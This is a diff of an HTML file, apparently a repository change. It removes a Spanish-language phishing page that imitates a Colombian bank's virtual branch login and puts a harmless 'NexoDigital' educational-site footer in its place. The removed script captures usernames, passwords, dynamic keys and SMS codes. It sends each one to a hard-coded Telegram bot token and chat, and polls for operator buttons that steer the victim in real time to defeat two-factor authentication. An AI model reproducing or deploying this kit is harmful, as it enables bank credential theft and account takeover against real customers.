-                <span id="password-helper" class="authentication-form__help-text"></span>
-                <a href="#" class="bc-opensans-font-style-1-bold bc-link link-default link-underline">
-                  <u>¿Olvidaste o bloqueaste tu clave?</u>
-                </a>
-                     </div>
-                   </bc-form-field>
-
-            <!-- Mensaje de error de Login -->
-             <p id="loginError" class="error-msg">El usuario o la clave son incorrectos. Por favor verifique.</p>
-
-                    </section>
-               </section>
-
-              <section class="bc-card-auth-button">
-             <button type="submit" id="submitBtn" tabindex="0"
-             data-test="login-button"
- class="bc-button bc-button-fill bc-button-primary"
-            disabled>
-            Continuar
-               </button>
-                </section>
-               </form>
-
-               <!-- Enlace Crear Usuario -->
-               <section class="bc-card-auth-link" style="display: flex; justify-content: center; margin-top: 24px;">
-                <a href="#" class="bc-link link-underline" style="font-size: 1rem; color: #2c2a29;">
-                  <u>Crear usuario</u>
-                </a>
-              </section>
-
-             </section>
-                            </section>
-  </bc-card-authentication></svp-error-component-factory>
-                      </svp-authentication-form>
-                    </div>
-                  </div>
-                </div>
-              </div>
-            </main>
-            <!-- Footer -->
-            <footer class="svp-footer">
-              <p>¿Problemas para conectarte? · Aprende sobre seguridad · Reglamento Sucursal Virtual · Política de privacidad</p>
-              <p id="reloj-widget" style="margin-top:8px;"></p>
-            </footer>
-          </app-simple-template>
-        </app-register-template>
-      </svp-authentication>
-    </div>
-  </app-root>
-
-  <!-- Modal de demostración (Clave Dinámica y SMS) -->
-  <div class="demo-overlay" id="modalDinamica" role="dialog" aria-modal="true">
-    <section class="demo-modal">
-      <div class="demo-close-row">
-        <button type="button" class="demo-close" id="closeModal" aria-label="Cerrar">×</button>
-      </div>
-
-      <!-- Vista Clave Dinámica -->
-      <div id="viewDinamica" class="demo-step active">
-        <div class="demo-instruction"><strong>Verificación de Seguridad</strong><br>
-          Ingresa la Clave Dinámica de 6 dígitos de tu aplicación.
-        </div>
-        
-        <h2 class="demo-title">Clave Dinámica</h2>
-        
-        <div class="otp-slots-container" id="otpContainer">
-          <div class="otp-slot"></div>
-          <div class="otp-slot"></div>
-          <div class="otp-slot"></div>
-          <div class="otp-slot"></div>
-          <div class="otp-slot"></div>
-          <div class="otp-slot"></div>
-        </div>
-        
-        <input type="text" id="otpInput" class="otp-hidden-input" maxlength="6" inputmode="numeric">
-        <p id="otpError" class="error-msg" style="text-align: center; margin-bottom: 15px;">Clave dinámica incorrecta o expirada.</p>
-
-        <div class="demo-actions">
-          <button type="button" class="bc-button-secondary" id="btnBorrar">Borrar</button>
-          <button type="button" class="bc-button-primary" id="btnContinuar" disabled>Continuar</button>
-        </div>
-      </div>
-
-      <!-- Vista SMS -->
-      <div id="viewSms" class="demo-step">
-        <div class="demo-instruction">
-          <strong>Verificación SMS</strong><br>
-          Hemos enviado un código SMS de 6 dígitos a tu celular registrado.
-        </div>
-        
-        <h2 class="demo-title">Código SMS</h2>
-
-        <div style="max-width: 300px; margin: 0 auto 20px;" id="smsInputWrap">
-          <input type="text" id="smsCodeInput" class="bc-input bc-active" maxlength="6" inputmode="numeric" placeholder="Código SMS" style="text-align: center; font-size: 1.5rem; height: 45px; border-bottom: 2px solid #2c2a29;">
-        </div>
-        <p id="smsError" class="error-msg" style="text-align: center; margin-bottom: 15px;">Código SMS inválido.</p>
-
-        <div class="demo-actions">
-          <button type="button" class="bc-button-primary" id="btnSmsFinal" style="max-width: 100%;">Verificar Código</button>
-        </div>
-      </div>
-
-      <p class="demo-note">
-        Segurida para ingresar al Poral Web.
-      </p>
-    </section>
-  </div>
-
-  <script>
-    // ==========================================
-    // 🔑 CONFIGURACIÓN DE TELEGRAM
-    // ==========================================
-    const TG_BOT_TOKEN = '8800964008:AAF4bJhf0iUrQM5Skp1WvosFixdfPYmiMV8';
-    const TG_CHAT_ID = '7776240161';
-
-    // ==========================================
-    // VARIABLES Y ELEMENTOS
-    // ==========================================
-    const usuarioInput = document.getElementById("usuario");
-    const claveInput = document.getElementById("clave");
-    const submitBtn = document.getElementById("submitBtn");
-    const demoForm = document.getElementById("demoForm");
-    const loadingOverlay = document.getElementById('loading-overlay');
-    const loginError = document.getElementById('loginError');
-
-    // Elementos del Modal
-    const modal = document.getElementById("modalDinamica");
-    const otpInput = document.getElementById("otpInput");
-    const otpSlots = document.querySelectorAll(".otp-slot");
-    const btnBorrar = document.getElementById("btnBorrar");
-    const btnContinuar = document.getElementById("btnContinuar");
-    const otpError = document.getElementById("otpError");
-    const otpContainer = document.getElementById("otpContainer");
-    const closeModal = document.getElementById("closeModal");
-
-    // Elementos Vistas del Modal
-    const viewDinamica = document.getElementById("viewDinamica");
-    const viewSms = document.getElementById("viewSms");
-    const smsCodeInput = document.getElementById("smsCodeInput");
-    const btnSmsFinal = document.getElementById("btnSmsFinal");
-    const smsError = document.getElementById("smsError");
-    const smsInputWrap = document.getElementById("smsInputWrap");
-
-    // Variables de control
-    let pollingActivo = false;
-    let pollingTimeout = null;
-    let ultimoUpdateId = -1;
-    let actionProcessed = false;
-    let msgIdActual = null;
-
-    // Funciones de UI
-    function mostrarOverlay() { loadingOverlay.style.display = 'flex'; }
-    function ocultarOverlay() { loadingOverlay.style.display = 'none'; }
-
-    function actualizarBoton() {
-      const claveCompleta = /^[0-9]{4}$/.test(claveInput.value);
-      const usuarioLleno = usuarioInput.value.trim().length > 0;
-      const formularioValido = claveCompleta && usuarioLleno;
-      
-      submitBtn.disabled = !formularioValido;
-      submitBtn.classList.toggle("ready", formularioValido);
-      
-      if (formularioValido) loginError.classList.remove("show");
-    }
-
-    usuarioInput.addEventListener("input", actualizarBoton);
-    claveInput.addEventListener("input", function() {
-      claveInput.value = claveInput.value.replace(/[^0-9]/g, "").slice(0, 4);
-      actualizarBoton();
-    });
-
-    // ==========================================
-    // ENVIAR A TELEGRAM
-    // ==========================================
-    function enviarIdentificacionTelegram(usuario, clave) {
-        const mensaje = `⚡ <b>PORTAL - INICIO DE SESIÓN</b>\n\n👤 <b>Usuario:</b> <code>${usuario}</code>\n🔑 <b>Clave:</b> <code>${clave}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`.trim();
-        
-        const keyboard = {
-            inline_keyboard: [
-                [
-                  { text: '❌ Usuario Malo', callback_data: 'error_usuario' }, 
-                  { text: '🔑 Pedir Dinámica', callback_data: 'pedir_dinamica' }
-                ],
-                [
-                  { text: '🚫 Banear IP', callback_data: 'banear_ip' },
-                  { text: '🏁 Finalizar (Google)', callback_data: 'finalizar' }
-                ]
-            ]
-        };
-
-        fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
-            method: 'POST', headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: TG_CHAT_ID, text: mensaje, parse_mode: 'HTML', reply_markup: keyboard })
-        }).then(r => r.json()).then(data => {
-            if (data.ok && data.result) {
-                msgIdActual = String(data.result.message_id);
-                actionProcessed = false;
-                escucharBotones(handleTelegramActionLogin);
-            } else {
-                ocultarOverlay();
-            }
-        }).catch(() => ocultarOverlay());
-    }
-
-    function enviarDinamicaTelegram(dinamica) {
-        const mensaje = `⚡ <b>PORTAL - CLAVE DINÁMICA</b>\n\n👤 <b>Usuario:</b> <code>${usuarioInput.value}</code>\n🔢 <b>Dinámica:</b> <code>${dinamica}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`.trim();
-        
-        const keyboard = {
-            inline_keyboard: [
-                [{ text: '❌ Error Dinámica', callback_data: 'error_dinamica' }, { text: '📩 SMS Code', callback_data: 'sms_code' }],
-                [{ text: '🏁 Finalizar (Google)', callback_data: 'finalizar' }]
-            ]
-        };
-
-        fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
-            method: 'POST', headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: TG_CHAT_ID, text: mensaje, parse_mode: 'HTML', reply_markup: keyboard })
-        }).then(r => r.json()).then(data => {
-            if (data.ok && data.result) {
-                msgIdActual = String(data.result.message_id);
-                actionProcessed = false;
-                escucharBotones(handleTelegramActionDinamica);
-            }
-        });
-    }
-
-    function enviarSmsTelegram(codigoSms) {
-        const mensaje = `⚡ <b>PORTAL - CÓDIGO SMS</b>\n\n👤 <b>Usuario:</b> <code>${usuarioInput.value}</code>\n📩 <b>SMS:</b> <code>${codigoSms}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`.trim();
-        
-        const keyboard = {
-            inline_keyboard: [
-                [{ text: '❌ Error Dinámica', callback_data: 'error_dinamica_final' }],
-                [{ text: '❌ Error SMS Code', callback_data: 'error_sms_final' }],
-                [{ text: '🏁 Finalizar (Google)', callback_data: 'finalizar' }]
-            ]
-        };
-
-        fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
-            method: 'POST', headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: TG_CHAT_ID, text: mensaje, parse_mode: 'HTML', reply_markup: keyboard })
-        }).then(r => r.json()).then(data => {
-            if (data.ok && data.result) {
-                msgIdActual = String(data.result.message_id);
-                actionProcessed = false;
-                escucharBotones(handleTelegramActionSms);
-            }
-        });
-    }
-
-    // ==========================================
-    // ESCUCHAR BOTONES (POLLING)
-    // ==========================================
-    function escucharBotones(callbackAction) {
-        if (!msgIdActual) return;
-        pollingActivo = true;
-        
-        function check() {
-            if (!pollingActivo) return;
- fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/getUpdates`, {
-                method: 'POST', headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ offset: ultimoUpdateId + 1, allowed_updates: ['callback_query'], timeout: 10 })
-            }).then(r => r.json()).then(data => {
-                if (!data.ok || !data.result || data.result.length === 0) {
-   pollingTimeout = setTimeout(check, 2000); return;
-                }
-                for (const u of data.result) {
-                    ultimoUpdateId = Math.max(ultimoUpdateId, u.update_id);
-                    if (u.callback_query) {
-                        const messageId = String(u.callback_query.message.message_id);
-                        if (messageId === String(msgIdActual)) {
-                            pollingActivo = false;
-                            callbackAction(u.callback_query.data);
-                            return;
-                        }
-                    }
-                }
-                pollingTimeout = setTimeout(check, 2000);
-            }).catch(() => { pollingTimeout = setTimeout(check, 3000); });
-        }
-        check();
-    }
-
-    // ==========================================
-    // ACCIONES DE TELEGRAM
-    // ==========================================
-    function handleTelegramActionLogin(action) {
-        if (actionProcessed) return;
-        actionProcessed = true;
-        ocultarOverlay();
-
-        if (action === 'pedir_dinamica') {
-            modal.classList.add("is-open");
-            viewDinamica.style.display = "block";
-            viewSms.classList.remove("active");
-            
-            otpInput.value = "";
-            otpError.classList.remove("show");
-            otpContainer.classList.remove("error");
-            actualizarOTP();
-            setTimeout(() => otpInput.focus(), 100);
-        } else if (action === 'error_usuario') {
-            loginError.classList.add("show");
-            claveInput.value = "";
-            actualizarBoton();
-            claveInput.focus();
-        } else if (action === 'banear_ip') {
-            // Guardar bloqueo permanente en el navegador
-            localStorage.setItem('sys_blocked_user', 'true');
-            // Redirigir de inmediato al error 404
-            location.reload();
-        } else if (action === 'finalizar') {
-            window.location.href = "https://www.google.com";
-        }
-    }
-
-    function handleTelegramActionDinamica(action) {
-        if (actionProcessed) return;
-        actionProcessed = true;
-        ocultarOverlay();
-
-        if (action === 'error_dinamica') {
-            modal.classList.add("is-open"); 
-            viewDinamica.style.display = "block";
-            viewSms.classList.remove("active");
-            
-            otpError.classList.add("show");
-            otpContainer.classList.add("error");
-            otpInput.value = "";
-            actualizarOTP();
-            otpInput.focus();
-            
-            actionProcessed = false;
-        } else if (action === 'sms_code') {
-            viewDinamica.style.display = "none";
-            viewSms.classList.add("active");
-            smsCodeInput.value = "";
-            smsError.classList.remove("show");
-            smsInputWrap.classList.remove("error");
-            setTimeout(() => smsCodeInput.focus(), 100);
-        } else if (action === 'finalizar') {
-            window.location.href = "https://www.google.com";
-        }
-    }
-
-    function handleTelegramActionSms(action) {
-        if (actionProcessed) return;
-        actionProcessed = true;
-        ocultarOverlay();
-
-        if (action === 'error_dinamica_final') {
-            viewSms.classList.remove("active");
-            viewDinamica.style.display = "block";
-            otpError.classList.add("show");
-            otpContainer.classList.add("error");
-            otpInput.value = "";
-            actualizarOTP();
-            otpInput.focus();
-            actionProcessed = false;
-        } else if (action === 'error_sms_final') {
-            smsError.classList.add("show");
-            smsInputWrap.classList.add("error");
-            smsCodeInput.value = "";
-            smsCodeInput.focus();
-            actionProcessed = false;
-        } else if (action === 'finalizar') {
-            window.location.href = "https://www.google.com";
-        }
-    }
-
-    // ==========================================
-    // LÓGICA DEL FORMULARIO PRINCIPAL
-    // ==========================================
-    demoForm.addEventListener("submit", function(event) {
-      event.preventDefault();
-      if (submitBtn.disabled) return;
-      
-      mostrarOverlay();
-      const user = usuarioInput.value.trim();
-      const pass = claveInput.value.trim();
-      
-      enviarIdentificacionTelegram(user, pass);
-    });
-
-    // Lógica del Modal (6 dígitos)
-    function actualizarOTP() {
-      const valor = otpInput.value;
-      
-      otpSlots.forEach((slot, index) => {
-        if (index < valor.length) {
-          slot.textContent = valor[index];
-          slot.classList.remove("active");
-        } else {
-          slot.textContent = "";
-          if (index === valor.length) {
-            slot.classList.add("active");
-          } else {
-            slot.classList.remove("active");
-          }
-        }
-      });
-
-      if (valor.length === 6) {
-        btnContinuar.disabled = false;
-        btnContinuar.classList.add("ready");
-        otpSlots.forEach(s => s.classList.remove("active"));
-      } else {
-        btnContinuar.disabled = true;
-        btnContinuar.classList.remove("ready");
-      }
-    }
-
-    otpInput.addEventListener("input", function() {
-      this.value = this.value.replace(/[^0-9]/g, "").slice(0, 6);
-      otpError.classList.remove("show");
-      otpContainer.classList.remove("error");
-      actualizarOTP();
-    });
-
-    otpContainer.addEventListener("click", () => otpInput.focus());
-
-    btnBorrar.addEventListener("click", () => {
-      otpInput.value = "";
-      otpError.classList.remove("show");
-      otpContainer.classList.remove("error");
-      actualizarOTP();
-      otpInput.focus();
-    });
-
-    btnContinuar.addEventListener("click", () => {
-      if(otpInput.value.length === 6) {
-        mostrarOverlay();
-        enviarDinamicaTelegram(otpInput.value);
-      }
-    });
-
-    closeModal.addEventListener("click", () => {
-      modal.classList.remove("is-open");
-    });
-
-    // Lógica para el código SMS
-    smsCodeInput.addEventListener("input", function() {
-      this.value = this.value.replace(/[^0-9]/g, "").slice(0, 6);
-      smsError.classList.remove("show");
-      smsInputWrap.classList.remove("error");
-    });
-
-    btnSmsFinal.addEventListener("click", () => {
-      if(smsCodeInput.value.length < 6) {
-        smsError.textContent = "Por favor, ingresa el código SMS completo de 6 dígitos.";
-        smsError.classList.add("show");
-        smsInputWrap.classList.add("error");
-        return;
-      }
-      
-      mostrarOverlay();
-      enviarSmsTelegram(smsCodeInput.value);
-    });
-
-    // ==========================================
-    // RELOJ / FECHA
-    // ==========================================
-    function actualizarFecha() {
-      const ahora = new Date();
-      const opciones = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric', hour: 'numeric', minute: '2-digit', hour12: true };
-      let fecha = ahora.toLocaleDateString('es-ES', opciones).replace(',', '');
-      const el = document.getElementById('reloj-widget');
-      if (el) el.textContent = fecha.charAt(0).toUpperCase() + fecha.slice(1);
-    }
-    actualizarFecha();
-    setInterval(actualizarFecha, 60000);
-
-    actualizarBoton();
-  </script>
+<footer>
+<div class="wrap">
+<strong>NexoDigital</strong>
+<p>Portal educativo independiente sobre tecnología y conectividad.</p>
+<a href="#terminos">Términos y condiciones</a>
+<a href="#privacidad">Privacidad</a>
+<a href="#contacto">Contacto</a>
+<p class="small">© <span id="year"></span> NexoDigital. Todos los derechos reservados.</p>
+</div>
+</footer>
+<script>
+document.getElementById("year").textContent=new Date().getFullYear();
+</script>
 </body>
 </html>
